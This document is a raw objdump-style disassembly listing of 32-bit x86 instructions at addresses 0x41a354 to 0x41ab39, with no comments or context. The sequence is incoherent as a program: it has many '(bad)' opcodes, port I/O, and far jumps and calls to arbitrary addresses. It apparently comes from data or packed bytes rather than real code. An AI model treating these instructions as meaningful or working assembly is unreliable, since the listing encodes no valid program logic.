  41a354:	cwde   
  41a355:	lds    edi,FWORD PTR [esp+ecx*2-0x62ba1f2a]
  41a35c:	adc    edx,DWORD PTR [edi+edx*4-0x7a401ee]
  41a363:	mov    ds:0xf46f22d3,al
  41a368:	cmc    
  41a369:	xchg   DWORD PTR [ebx-0x334a2ee8],ebx
  41a36f:	cmp    BYTE PTR [ecx+0xcd48de],bl
  41a375:	pop    ebp
  41a376:	adc    eax,0x73f7f32b
  41a37b:	adc    ecx,DWORD PTR [ecx+0x29]
  41a37e:	push   ecx
  41a37f:	xchg   ecx,eax
  41a380:	mov    edx,0x1a9dad55
  41a385:	ja     0x41a3a9
  41a387:	and    eax,0xf2d6728a
  41a38c:	mov    ebp,0x938700bb
  41a391:	inc    edi
  41a392:	out    0x75,al
  41a394:	or     DWORD PTR [edi-0x7b],edi
  41a397:	pop    esi
  41a398:	ins    BYTE PTR es:[edi],dx
  41a399:	aas    
  41a39a:	es (bad) 
  41a39c:	and    eax,0x65223419
  41a3a1:	(bad)
  41a3a4:	jp     0x41a402
  41a3a6:	xchg   esp,eax
  41a3a7:	and    eax,0xb55fe9c3
  41a3ac:	int3   
  41a3ad:	aaa    
  41a3ae:	jecxz  0x41a403
  41a3b0:	jmp    0x2c51:0x78401df3
  41a3b7:	ds push ss
  41a3b9:	das    
  41a3ba:	lods   eax,DWORD PTR ds:[esi]
  41a3bb:	mov    esi,0x984601d9
  41a3c0:	test   al,0x42
  41a3c2:	das    
  41a3c3:	mov    dh,0xc8
  41a3c5:	stc    
  41a3c6:	out    0x5,al
  41a3c8:	imul   ecx,DWORD PTR [esi-0x21],0xffffffaa
  41a3cc:	into   
  41a3cd:	add    cl,BYTE PTR [ebp-0x690bfb76]
  41a3d3:	jg     0x41a3d0
  41a3d5:	add    eax,0xd6aa2f11
  41a3da:	fsubr  DWORD PTR [edx]
  41a3dc:	ret    
  41a3dd:	jbe    0x41a3f1
  41a3df:	sub    al,0xe9
  41a3e1:	clc    
  41a3e2:	je     0x41a43b
  41a3e4:	popf   
  41a3e5:	xorps  xmm0,xmm5
  41a3e8:	pop    ecx
  41a3e9:	or     DWORD PTR [esi+0x500d863a],eax
  41a3ef:	repz inc ebx
  41a3f1:	cld    
  41a3f2:	push   esi
  41a3f3:	inc    edx
  41a3f4:	outs   dx,BYTE PTR ds:[esi]
  41a3f5:	cmpxchg BYTE PTR [edx-0x3294d7ed],bl
  41a3fc:	ss push ebx
  41a3fe:	jno    0x41a3e6
  41a400:	hlt    
  41a401:	mov    eax,ds
  41a403:	aam    0x3c
  41a405:	sub    DWORD PTR [edi+0x7c],ecx
  41a408:	inc    eax
  41a409:	icebp  
  41a40a:	in     al,dx
  41a40b:	leave  
  41a40c:	cmp    esi,esp
  41a40e:	adc    bl,BYTE PTR [eax+edx*2]
  41a411:	clc    
  41a412:	lea    edx,[ecx-0x59bbf39]
  41a418:	dec    ebp
  41a419:	icebp  
  41a41a:	sub    BYTE PTR [edi-0x5d],bh
  41a41d:	fsub   QWORD PTR [ebp-0x29f81527]
  41a423:	add    BYTE PTR [eax-0x11fcd121],ch
  41a429:	or     esi,DWORD PTR es:[eax+0x4586a34d]
  41a430:	xor    eax,0x3fe98125
  41a435:	fs mov dh,0xc8
  41a438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a439:	push   ds
  41a43a:	mov    edx,0xfa87618c
  41a43f:	loope  0x41a428
  41a441:	mov    ebx,0x7b50e1ee
  41a446:	imul   ebp,DWORD PTR [esi+0x3c],0xffffffcb
  41a44a:	and    eax,0xbe3c05f1
  41a44f:	rcr    BYTE PTR [edi-0x24],1
  41a452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a453:	aas    
  41a454:	jo     0x41a3ee
  41a456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a457:	mov    ecx,DWORD PTR [esi-0x7f]
  41a45a:	in     al,dx
  41a45b:	adc    edi,DWORD PTR [esi+esi*1+0xe]
  41a45f:	data16 arpl cx,bp
  41a462:	fbld   TBYTE PTR [edx]
  41a464:	je     0x41a4c2
  41a466:	rcr    dh,0x58
  41a469:	add    BYTE PTR [ebx+eax*8-0x7f55327e],0xd9
  41a471:	ret    0xa41f
  41a474:	out    dx,eax
  41a475:	push   es
  41a476:	shl    BYTE PTR [esi],0x27
  41a479:	lahf   
  41a47a:	out    0x13,al
  41a47c:	ins    DWORD PTR es:[edi],dx
  41a47d:	mov    esi,0x50adfbb1
  41a482:	or     eax,0xfb70d96d
  41a487:	sub    dl,BYTE PTR [esi-0xb]
  41a48a:	mov    fs,WORD PTR [eax+0x40d5fc0]
  41a490:	pushf  
  41a491:	pop    ds
  41a492:	bnd jg 0x41a458
  41a495:	mov    dl,0x1
  41a497:	xor    eax,0x7c71
	...
  41a514:	pop    esi
  41a515:	mov    DWORD PTR ds:0x7feed766,eax
  41a51b:	mov    ecx,0x4f6277d8
  41a520:	and    ebp,DWORD PTR [esi+0x4519191e]
  41a526:	add    DWORD PTR [eax],eax
  41a528:	outs   dx,BYTE PTR ds:[esi]
  41a529:	pop    es
  41a52a:	add    BYTE PTR [eax],al
  41a52c:	imul   eax,DWORD PTR [edi+edx*8],0x829e0110
  41a533:	mov    ebx,0x38ddb59b
  41a538:	mov    al,ds:0x30047e4f
  41a53d:	shr    BYTE PTR [eax-0x231b5a4d],1
  41a543:	aas    
  41a544:	shl    BYTE PTR [ecx],0x3
  41a547:	mov    al,ds:0x57ca15d4
  41a54c:	push   eax
  41a54d:	cmp    DWORD PTR [edi+0x63],edx
  41a550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a551:	mov    dl,0x4b
  41a553:	shr    DWORD PTR [edx],0x5e
  41a556:	dec    ebx
  41a557:	adc    eax,0x34753097
  41a55c:	pop    ebp
  41a55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a55e:	xor    edi,ecx
  41a560:	xlat   BYTE PTR ds:[ebx]
  41a561:	aaa    
  41a562:	retf   
  41a563:	or     eax,0xadb8eb29
  41a568:	and    BYTE PTR [ecx],dl
  41a56a:	sbb    al,0x22
  41a56c:	ret    0x2ab2
  41a56f:	loopne 0x41a4f6
  41a571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a572:	mov    ah,0x4a
  41a574:	dec    esi
  41a575:	and    esi,DWORD PTR [edx-0x348dd4ae]
  41a57b:	shr    BYTE PTR [eax-0x43],1
  41a57e:	jmp    0x41a5b8
  41a580:	fwait
  41a581:	es xchg esp,eax
  41a583:	cdq    
  41a584:	adc    ch,BYTE PTR [edx-0x4cffdb6]
  41a58a:	lahf   
  41a58b:	mov    edi,0x13a4c7fa
  41a590:	push   esp
  41a591:	lods   eax,DWORD PTR ds:[esi]
  41a592:	sbb    al,0x52
  41a594:	push   0xffffff91
  41a596:	cmp    BYTE PTR [ebp-0x1d30e4ca],dh
  41a59c:	xchg   esi,eax
  41a59d:	test   BYTE PTR [eax+0x6ec2b4a0],ch
  41a5a3:	out    0xe,eax
  41a5a5:	das    
  41a5a6:	pushf  
  41a5a7:	out    0xbd,eax
  41a5a9:	adc    DWORD PTR [ebp-0x15],esi
  41a5ac:	into   
  41a5ad:	mov    cl,0x95
  41a5af:	cmp    ah,BYTE PTR [eax-0x52567656]
  41a5b5:	dec    ecx
  41a5b6:	test   DWORD PTR [eax],esp
  41a5b8:	xchg   DWORD PTR [ecx+0x9],edi
  41a5bb:	aad    0x2e
  41a5bd:	cmp    eax,0xf85de621
  41a5c2:	jae    0x41a62d
  41a5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c5:	xchg   esi,eax
  41a5c6:	sub    DWORD PTR [eax+0x11d5a11c],esp
  41a5cc:	mov    esp,0x9aad0097
  41a5d1:	(bad)  
  41a5d2:	mov    ebp,0x3aab413e
  41a5d7:	sbb    DWORD PTR [edi+eax*8-0x29],ecx
  41a5db:	fimul  DWORD PTR [edx+ebx*8]
  41a5de:	mov    ah,0x1
  41a5e0:	aad    0xa
  41a5e2:	cmp    DWORD PTR [edi-0x75],eax
  41a5e5:	sub    eax,0x48fcb893
  41a5ea:	call   esp
  41a5ec:	lods   al,BYTE PTR ds:[esi]
  41a5ed:	jmp    0xefcfc3c8
  41a5f2:	cmc    
  41a5f3:	out    0xe6,al
  41a5f5:	loopne 0x41a64c
  41a5f7:	mov    edx,0xd430f75d
  41a5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5fd:	xor    al,0x81
  41a5ff:	cmp    al,0xd7
  41a601:	nop
  41a602:	scas   eax,DWORD PTR es:[edi]
  41a603:	(bad)  
  41a604:	cli    
  41a605:	mov    BYTE PTR [eax+ebx*2+0x78e12696],cl
  41a60c:	je     0x41a5c7
  41a60e:	ins    BYTE PTR es:[edi],dx
  41a60f:	mov    DWORD PTR [ecx-0x42],edi
  41a612:	sub    BYTE PTR [ebx-0x24],dh
  41a615:	scas   eax,DWORD PTR es:[edi]
  41a616:	xor    DWORD PTR [ebp-0x31],0x7
  41a61a:	xchg   edx,eax
  41a61b:	xor    DWORD PTR [edx-0x2ff0b468],esp
  41a621:	fs imul edx,DWORD PTR cs:[ecx],0x62
  41a626:	imul   edx,DWORD PTR [ecx],0x79195cc7
  41a62c:	dec    edx
  41a62d:	test   al,0x29
  41a62f:	je     0x41a5ce
  41a631:	fsub   DWORD PTR [eax+0x2a]
  41a634:	clc    
  41a635:	or     dl,BYTE PTR [esi-0x69]
  41a638:	mov    bl,0x70
  41a63a:	or     DWORD PTR [ecx+0x1a09654d],eax
  41a640:	into   
  41a641:	add    eax,0xac868c3
  41a646:	imul   edx,ebx,0xfffffff2
  41a649:	push   edi
  41a64a:	xchg   ecx,eax
  41a64b:	test   al,0x1c
  41a64d:	outs   dx,DWORD PTR ds:[esi]
  41a64e:	mov    es:0x647d0e7c,al
  41a654:	mov    ds:0x66a98c8c,al
  41a659:	dec    eax
  41a65a:	adc    BYTE PTR [eax-0x5c],0x28
  41a65e:	cmp    eax,0xe75d4a51
  41a663:	xor    esp,DWORD PTR [esi]
  41a665:	(bad)  
  41a666:	pop    ecx
  41a667:	cld    
  41a668:	adc    bl,dh
  41a66a:	sbb    eax,0x4e70d5d8
  41a66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a670:	popa   
  41a671:	(bad)  
  41a672:	push   esi
  41a673:	sbb    dh,BYTE PTR [esi-0x3a]
  41a676:	cmc    
  41a677:	jb     0x41a655
  41a679:	jle    0x41a63e
  41a67b:	xchg   ecx,eax
  41a67c:	push   edx
  41a67d:	je     0x41a65e
  41a67f:	xchg   ebx,eax
  41a680:	sbb    DWORD PTR [ecx+0x727926d],esp
  41a686:	pop    edx
  41a687:	and    BYTE PTR [esi+0x38d667a5],al
  41a68d:	retf   0x6fd7
  41a690:	leave  
  41a691:	mov    eax,ds:0x8ed54645
  41a696:	repnz xor DWORD PTR [edi-0x5868c093],ebx
  41a69d:	test   BYTE PTR [eax+edx*8-0x2c],bh
  41a6a1:	les    ebp,FWORD PTR [ecx]
  41a6a3:	lods   eax,DWORD PTR ds:[esi]
  41a6a4:	jo     0x41a6e7
  41a6a6:	jecxz  0x41a66f
  41a6a8:	(bad)  
  41a6a9:	sbb    edx,ebx
  41a6ab:	jno    0x41a69b
  41a6ad:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6b0:	int    0x34
  41a6b2:	out    0x52,eax
  41a6b4:	xchg   ebx,eax
  41a6b5:	clc    
  41a6b6:	enter  0x6966,0x86
  41a6ba:	(bad)  
  41a6bb:	jmp    0x41a6ba
  41a6bd:	cwde   
  41a6be:	retf   
  41a6bf:	mov    esi,0x7ddad6e5
  41a6c4:	push   eax
  41a6c5:	push   es
  41a6c6:	mov    bl,0x35
  41a6c8:	xor    esp,DWORD PTR [eax-0x705438b1]
  41a6ce:	mov    ch,0x6a
  41a6d0:	xor    al,0x71
  41a6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6d3:	ret    
  41a6d4:	inc    ebx
  41a6d5:	jnp    0x41a74a
  41a6d7:	ss mov esp,0x408beb1b
  41a6dd:	adc    dh,BYTE PTR [eax-0x67]
  41a6e0:	lds    ecx,FWORD PTR [eax+0x22]
  41a6e3:	ds and eax,0x881830c
  41a6e9:	inc    edx
  41a6ea:	ja     0x41a705
  41a6ec:	call   0xbbdb0d9f
  41a6f1:	push   0x2f
  41a6f3:	pop    eax
  41a6f4:	ficomp WORD PTR [eiz*1+0x68158905]
  41a6fb:	or     ebp,DWORD PTR [eax]
  41a6fd:	cwde   
  41a6fe:	jge    0x41a6fd
  41a700:	dec    DWORD PTR [edx]
  41a702:	xchg   edx,eax
  41a703:	dec    edx
  41a704:	mov    ds:0x99ffab03,al
  41a709:	xlat   BYTE PTR ds:[ebx]
  41a70a:	push   esp
  41a70b:	jl     0x41a74f
  41a70d:	mov    cl,0xef
  41a70f:	test   eax,0xa483e47b
  41a714:	leave  
  41a715:	lea    ecx,[ecx]
  41a717:	ror    DWORD PTR [esi-0x29],1
  41a71a:	std    
  41a71b:	sbb    bh,ah
  41a71d:	mov    esi,gs
  41a71f:	dec    edi
  41a720:	mov    bl,0xf8
  41a722:	sub    BYTE PTR [edx+0x1b6e5604],dh
  41a728:	push   esp
  41a729:	aam    0x0
  41a72b:	(bad)  
  41a72c:	push   ebp
  41a72d:	jmp    0xc487f589
  41a732:	push   esi
  41a733:	fild   DWORD PTR [eax+0x38]
  41a736:	and    eax,0xc70cb3f7
  41a73b:	int    0x45
  41a73d:	mov    ch,0xde
  41a73f:	adc    DWORD PTR [ecx+ebx*2],edi
  41a742:	daa    
  41a743:	cdq    
  41a744:	fld    QWORD PTR [ebp-0x31bb759a]
  41a74a:	xor    al,0x76
  41a74c:	cdq    
  41a74d:	test   al,0x37
  41a74f:	dec    esp
  41a750:	xchg   edi,eax
  41a751:	push   es
  41a752:	fsubr  DWORD PTR [ebx-0x13]
  41a755:	mov    edx,0x6018aea8
  41a75a:	dec    eax
  41a75b:	fcomp  QWORD PTR [edx+0x1e]
  41a75e:	pop    esp
  41a75f:	fisub  DWORD PTR ds:0x34b67a3b
  41a765:	(bad)  
  41a766:	xchg   ebp,eax
  41a767:	sub    al,0x76
  41a769:	sbb    bh,BYTE PTR [ecx-0x40]
  41a76c:	test   al,0x2c
  41a76e:	ss add eax,0xa8089f0e
  41a774:	xor    bh,BYTE PTR [edx]
  41a776:	jecxz  0x41a761
  41a778:	pop    eax
  41a779:	mov    al,ds:0x56140bad
  41a77e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a77f:	cmp    eax,0xe2dce399
  41a784:	cmp    al,0x8b
  41a786:	div    DWORD PTR [edi]
  41a788:	xchg   ebp,eax
  41a789:	aaa    
  41a78a:	push   cs
  41a78b:	fistp  DWORD PTR [edx+0x6d]
  41a78e:	pop    es
  41a78f:	or     ah,BYTE PTR [ecx]
  41a791:	cmp    eax,0x15853bcd
  41a796:	inc    ebx
  41a797:	push   esp
  41a798:	jo     0x41a751
  41a79a:	mov    ebx,0xe08a059b
  41a79f:	ret    
  41a7a0:	icebp  
  41a7a1:	mov    dh,0xe9
  41a7a3:	xchg   edx,eax
  41a7a4:	ins    DWORD PTR es:[edi],dx
  41a7a5:	cmp    al,0xde
  41a7a7:	popf   
  41a7a8:	faddp  st(2),st
  41a7aa:	or     eax,ebp
  41a7ac:	fld    QWORD PTR [edx+edi*2-0xfa27425]
  41a7b3:	loope  0x41a819
  41a7b5:	pop    eax
  41a7b6:	call   0x6cae2e9f
  41a7bb:	imul   ebx,DWORD PTR [edx+0x64],0xf
  41a7bf:	xchg   ebx,eax
  41a7c0:	sub    eax,0xd0aae4dd
  41a7c5:	mov    al,ds:0xb9ff519b
  41a7ca:	call   0xe5ea:0xe8f3d02b
  41a7d1:	mov    edx,0xfed2addf
  41a7d6:	mov    cl,0xbd
  41a7d8:	mov    cl,0xe4
  41a7da:	or     eax,0xe1a481a0
  41a7df:	cmp    edx,edi
  41a7e1:	(bad)  
  41a7e2:	cmp    DWORD PTR [edx+0x1a],edx
  41a7e5:	dec    esi
  41a7e6:	fdivr  QWORD PTR [ecx+0x23]
  41a7e9:	pop    esi
  41a7ea:	aas    
  41a7eb:	inc    ebp
  41a7ec:	push   edx
  41a7ed:	xor    eax,0x64d68521
  41a7f2:	ret    
  41a7f3:	(bad)  
  41a7f4:	nop
  41a7f5:	xchg   edi,eax
  41a7f6:	imul   ecx,esi,0x73
  41a7f9:	retf   0x2ca1
  41a7fc:	fild   QWORD PTR [ecx+esi*8]
  41a7ff:	pusha  
  41a800:	jae    0x41a7f9
  41a802:	(bad)  
  41a803:	cmc    
  41a804:	aad    0x17
  41a806:	inc    ecx
  41a807:	xchg   esp,eax
  41a808:	shl    BYTE PTR [esi-0x28ffda4a],0xde
  41a80f:	inc    ebp
  41a810:	xchg   esp,eax
  41a811:	cmp    al,BYTE PTR [ebx+0x2e]
  41a814:	cmp    DWORD PTR [ebx+0x1c],edx
  41a817:	add    DWORD PTR [edi-0x1d21149e],edi
  41a81d:	repnz inc di
  41a820:	(bad)
  41a823:	dec    eax
  41a824:	sbb    dl,dh
  41a826:	je     0x41a7b9
  41a828:	(bad)  
  41a82a:	mov    ecx,0xd2d930c3
  41a82f:	shr    BYTE PTR [ebp-0x2b],1
  41a832:	iret   
  41a833:	mov    ecx,0x9098bd1a
  41a838:	adc    al,0x10
  41a83a:	push   0x30754f9b
  41a83f:	push   ebx
  41a840:	dec    ebx
  41a841:	stos   BYTE PTR es:[edi],al
  41a842:	iret   
  41a843:	cmp    DWORD PTR [ebx],edx
  41a845:	aad    0xeb
  41a847:	mov    ah,0x38
  41a849:	fmul   DWORD PTR [esi+0x7]
  41a84c:	jne    0x41a8ac
  41a84e:	psrld  mm2,mm0
  41a851:	cs add cl,cl
  41a854:	push   esp
  41a855:	mov    cs,WORD PTR [eax-0x1f6b5bf5]
  41a85b:	(bad)  
  41a85c:	stc    
  41a85d:	cli    
  41a85e:	loopne 0x41a82e
  41a860:	jp     0x41a897
  41a862:	xchg   esp,eax
  41a863:	(bad)  
  41a865:	dec    ebx
  41a866:	xor    eax,0xb4330319
  41a86b:	ret    
  41a86c:	xchg   BYTE PTR [ecx-0x7b],dh
  41a86f:	stos   DWORD PTR es:[edi],eax
  41a870:	mov    ecx,0x805d665e
  41a875:	addr16 daa 
  41a877:	loopne 0x41a866
  41a879:	out    dx,al
  41a87a:	sbb    al,BYTE PTR [ebx+0x455ae10]
  41a880:	int    0xcb
  41a882:	add    ch,ch
  41a884:	mov    BYTE PTR ds:0xb02a2fe4,ah
  41a88a:	imul   ecx,edi,0xe6471000
  41a890:	lea    ebx,[ebx]
  41a892:	pop    ebx
  41a893:	jmp    0x41a912
  41a895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a896:	les    ecx,FWORD PTR [eax-0x6b]
  41a899:	and    al,0x1e
  41a89b:	pop    edi
  41a89c:	xor    al,0x62
  41a89e:	pop    ds
  41a89f:	push   esi
  41a8a0:	cs adc edx,ebp
  41a8a3:	xchg   esp,eax
  41a8a4:	xchg   esp,eax
  41a8a5:	fadd   QWORD PTR [esi-0x7089b68a]
  41a8ab:	shl    DWORD PTR [ecx+0x2e],0x27
  41a8af:	mov    dh,0xc5
  41a8b1:	mov    esp,0x14f85651
  41a8b6:	jmp    0xdb3971f5
  41a8bb:	jmp    0x2871:0x77bee113
  41a8c2:	arpl   WORD PTR ds:0xc542e323,sp
  41a8c8:	pop    es
  41a8c9:	aas    
  41a8ca:	push   cs
  41a8cb:	jecxz  0x41a91e
  41a8cd:	xor    edx,0xf35fdef5
  41a8d3:	loope  0x41a8be
  41a8d5:	jl     0x41a915
  41a8d7:	jecxz  0x41a884
  41a8d9:	or     al,0x5b
  41a8db:	cdq    
  41a8dc:	push   esi
  41a8dd:	dec    eax
  41a8de:	cmc    
  41a8df:	aas    
  41a8e0:	mov    dl,BYTE PTR [esi-0x1b]
  41a8e3:	jns    0x41a880
  41a8e5:	sahf   
  41a8e6:	(bad)  
  41a8e7:	fiadd  DWORD PTR [edi+0x19]
  41a8ea:	retf   
  41a8eb:	fisttp WORD PTR [eax]
  41a8ed:	add    ch,bl
  41a8ef:	cmp    ah,BYTE PTR [esi]
  41a8f1:	jp     0x41a913
  41a8f3:	aas    
  41a8f4:	pop    edx
  41a8f5:	sbb    eax,ebp
  41a8f7:	fiadd  DWORD PTR [esi+ecx*4+0x56]
  41a8fb:	mov    ds:0x1f6c01b4,eax
  41a900:	mov    dh,0x64
  41a902:	xor    eax,0xce05efcb
  41a907:	fst    DWORD PTR [ecx-0x48]
  41a90a:	scas   al,BYTE PTR es:[edi]
  41a90b:	pop    eax
  41a90c:	cld    
  41a90d:	push   0x20
  41a90f:	arpl   WORD PTR [eax-0x18],ax
  41a912:	add    eax,0xed138455
  41a917:	push   cs
  41a918:	shl    DWORD PTR [ebx-0x2a87db41],1
  41a91e:	pop    eax
  41a91f:	push   edx
  41a920:	or     edx,edx
  41a922:	xchg   ecx,eax
  41a923:	pop    ss
  41a924:	nop
  41a925:	xchg   esi,eax
  41a926:	adc    BYTE PTR ds:0x8c0441f7,0x5e
  41a92d:	jp     0x41a954
  41a92f:	lahf   
  41a930:	jne    0x41a8e8
  41a932:	adc    al,0x56
  41a934:	leave  
  41a935:	lock inc DWORD PTR [ebp-0x2b]
  41a939:	mov    ebp,0x215df6a
  41a93e:	out    0xae,al
  41a940:	jb     0x41a99a
  41a942:	cmp    bl,bl
  41a944:	cli    
  41a945:	mov    ecx,DWORD PTR [eax-0x2f]
  41a948:	out    dx,al
  41a949:	add    al,0x50
  41a94b:	sbb    ebp,0xffffffd1
  41a94e:	aaa    
  41a94f:	or     eax,ebx
  41a951:	cwde   
  41a952:	xor    BYTE PTR [esi-0x5c],dh
  41a955:	xor    DWORD PTR [edx+0x72],esp
  41a958:	push   ebx
  41a959:	das    
  41a95a:	iret   
  41a95b:	test   eax,0xb50f325c
  41a960:	clc    
  41a961:	mov    ecx,0x1c123aae
  41a966:	add    di,dx
  41a969:	sbb    esp,esp
  41a96b:	adc    eax,0x24d69cd4
  41a970:	imul   al
  41a972:	sbb    dh,BYTE PTR [eax]
  41a974:	(bad)  
  41a975:	jp     0x41a903
  41a977:	sub    eax,DWORD PTR [esi+0x347c6e30]
  41a97d:	sub    edx,DWORD PTR [ecx-0x5f]
  41a980:	push   es
  41a981:	jae    0x41a989
  41a983:	loope  0x41a969
  41a985:	or     bl,BYTE PTR [ebp-0x2e]
  41a988:	adc    BYTE PTR [ebp+0x7714d6ac],0x8a
  41a98f:	adc    eax,0xd41786a2
  41a994:	mov    ds:0xaa14d018,eax
  41a999:	fistp  DWORD PTR [edi-0x55]
  41a99c:	or     BYTE PTR [ecx+0x5fbec7b0],bh
  41a9a2:	call   0x28becec6
  41a9a7:	sbb    eax,0x50098c98
  41a9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9ad:	repz loopne 0x41a960
  41a9b0:	and    dl,BYTE PTR [edi]
  41a9b2:	ja     0x41a99d
  41a9b4:	scas   al,BYTE PTR es:[edi]
  41a9b5:	ficom  WORD PTR ds:0x619afcc1
  41a9bb:	lods   eax,DWORD PTR ds:[esi]
  41a9bc:	jecxz  0x41a99c
  41a9be:	cmp    ch,dh
  41a9c0:	lock (bad) 
  41a9c2:	dec    esp
  41a9c3:	sahf   
  41a9c4:	sub    al,BYTE PTR [esi]
  41a9c6:	(bad)  
  41a9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9c8:	vpcmpeqd ymm5,ymm2,ymm3
  41a9cc:	clc    
  41a9cd:	fimul  DWORD PTR [ecx+0x2f]
  41a9d0:	ds popa 
  41a9d2:	sub    bh,BYTE PTR [esi-0x37ee47f]
  41a9d8:	push   esi
  41a9d9:	sbb    al,0x11
  41a9db:	push   ebx
  41a9dc:	out    dx,eax
  41a9dd:	pop    edi
  41a9de:	in     eax,dx
  41a9df:	repnz ins BYTE PTR es:[edi],dx
  41a9e1:	arpl   WORD PTR [ecx],di
  41a9e3:	sbb    eax,0xa1a2d41b
  41a9e8:	test   DWORD PTR [ebx+0x27a01977],ebp
  41a9ee:	dec    ecx
  41a9ef:	dec    edi
  41a9f0:	mov    esi,0x47245ae7
  41a9f5:	scas   eax,DWORD PTR es:[edi]
  41a9f6:	push   eax
  41a9f7:	pop    ds
  41a9f8:	push   DWORD PTR [eax+edx*8-0x6a]
  41a9fc:	stos   DWORD PTR es:[edi],eax
  41a9fd:	in     eax,dx
  41a9fe:	lds    esp,FWORD PTR [edx]
  41aa00:	int    0xe3
  41aa02:	jle    0x41aa0e
  41aa04:	(bad)  
  41aa05:	jmp    0xe0e2:0x4c833dc9
  41aa0c:	mul    BYTE PTR [ecx+0x34e2e925]
  41aa12:	repnz ror BYTE PTR [edi-0x17761906],1
  41aa19:	ss sub edi,edi
  41aa1c:	sbb    DWORD PTR [esp+ecx*4],eax
  41aa1f:	or     bl,BYTE PTR [ebx]
  41aa21:	mov    edi,DWORD PTR [esi-0x1a3dd06e]
  41aa27:	idiv   BYTE PTR [esi+0x5bc59a4f]
  41aa2d:	sti    
  41aa2e:	test   eax,0x2b3ae0b0
  41aa33:	sub    BYTE PTR [edi+0xa034e0],dh
  41aa39:	or     BYTE PTR [edi+0x22],ch
  41aa3c:	cmp    DWORD PTR [ebx],esi
  41aa3e:	mov    esi,0x57683d56
  41aa43:	cmp    eax,0xb20f98c8
  41aa48:	mov    BYTE PTR [ecx+0x1effaca3],ch
  41aa4e:	popf   
  41aa4f:	add    esi,DWORD PTR [ecx]
  41aa51:	ja     0x41a9f8
  41aa53:	addr16 loop 0x41aa6c
  41aa56:	pop    ebx
  41aa57:	jmp    0x41aacf
  41aa59:	inc    esp
  41aa5a:	xchg   ebx,eax
  41aa5b:	push   ecx
  41aa5c:	arpl   WORD PTR [ecx],ax
  41aa5e:	sbb    al,0x31
  41aa60:	in     al,dx
  41aa61:	mov    ds,WORD PTR [eax+0x1d20cd4b]
  41aa67:	cmp    eax,0x1e083975
  41aa6c:	push   edx
  41aa6d:	xor    BYTE PTR [ecx],bl
  41aa6f:	pop    es
  41aa70:	jne    0x41a9fc
  41aa72:	adc    DWORD PTR [ecx+0x53ed7d41],esp
  41aa78:	add    al,al
  41aa7a:	jmp    0x41aa81
  41aa7c:	pushf  
  41aa7d:	outs   dx,BYTE PTR ds:[esi]
  41aa7e:	pop    ds
  41aa7f:	lea    esi,ds:0xee670be7
  41aa85:	ret    0x1256
  41aa88:	mov    BYTE PTR [esi+0x7d],dl
  41aa8b:	fld    TBYTE PTR [edi]
  41aa8d:	xchg   BYTE PTR [ecx+eax*2],ah
  41aa90:	fwait
  41aa91:	(bad)  
  41aa92:	enter  0x5f1e,0x59
  41aa96:	dec    eax
  41aa97:	pop    ss
  41aa98:	or     al,0xf7
  41aa9a:	ret    0x261e
  41aa9d:	aad    0x71
  41aa9f:	jg     0x41ab13
  41aaa1:	dec    esp
  41aaa2:	push   es
  41aaa3:	stos   DWORD PTR es:[edi],eax
  41aaa4:	outs   dx,BYTE PTR ds:[esi]
  41aaa5:	fs cli 
  41aaa7:	std    
  41aaa8:	fild   WORD PTR [edx]
  41aaaa:	push   edi
  41aaab:	xchg   ecx,eax
  41aaac:	cmp    BYTE PTR [eax+edx*4],0x84
  41aab0:	out    0x15,al
  41aab2:	dec    ecx
  41aab3:	js     0x41aa39
  41aab5:	test   DWORD PTR [edx+0x6c],ebx
  41aab8:	xor    ebx,edx
  41aaba:	test   eax,0x8961393
  41aabf:	test   edi,0xa765018f
  41aac5:	mov    BYTE PTR [edi],al
  41aac7:	jmp    0xdd66:0xd2da6843
  41aace:	xchg   edi,eax
  41aacf:	pop    edi
  41aad0:	stos   DWORD PTR es:[edi],eax
  41aad1:	adc    ebp,DWORD PTR [edi+0x323eb400]
  41aad7:	sub    DWORD PTR [ebx],edx
  41aad9:	test   ah,al
  41aadb:	jo     0x41aafa
  41aadd:	sub    BYTE PTR [edi],0x6f
  41aae0:	jp     0x41aaaf
  41aae2:	cdq    
  41aae3:	in     eax,0x75
  41aae5:	xor    BYTE PTR [edi-0x70],al
  41aae8:	dec    esp
  41aae9:	jp     0x41ab17
  41aaeb:	pop    ecx
  41aaec:	inc    esi
  41aaed:	xor    al,0xfb
  41aaef:	loopne 0x41aa8c
  41aaf1:	jmp    0xafe6:0x1f9b5bdb
  41aaf8:	pop    ds
  41aaf9:	mov    al,ds:0xc90e37e5
  41aafe:	push   cs
  41aaff:	nop
  41ab00:	leave  
  41ab01:	sbb    BYTE PTR [edi+0x55],cl
  41ab04:	mov    dl,0xd1
  41ab06:	(bad)
  41ab09:	mov    bl,0x8d
  41ab0b:	scas   al,BYTE PTR es:[edi]
  41ab0c:	in     eax,dx
  41ab0d:	push   ebp
  41ab0e:	adc    eax,0x72e74f2b
  41ab13:	xor    DWORD PTR [bp+si],ebx
  41ab16:	xor    al,0xc3
  41ab18:	addr16 push edx
  41ab1a:	adc    ch,bl
  41ab1c:	std    
  41ab1d:	push   ecx
  41ab1e:	in     eax,dx
  41ab1f:	mov    dh,0xbe
  41ab21:	jo     0x41aacb
  41ab23:	pop    ebp
  41ab24:	xor    BYTE PTR [ebx+0x35437b1a],ah
  41ab2a:	push   esi
  41ab2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2c:	rcr    ch,0x27
  41ab2f:	rol    BYTE PTR [ebx-0x561ebde],0x1e
  41ab36:	pop    edx
  41ab37:	in     al,0xac
  41ab39:	jo     0x41ab5e
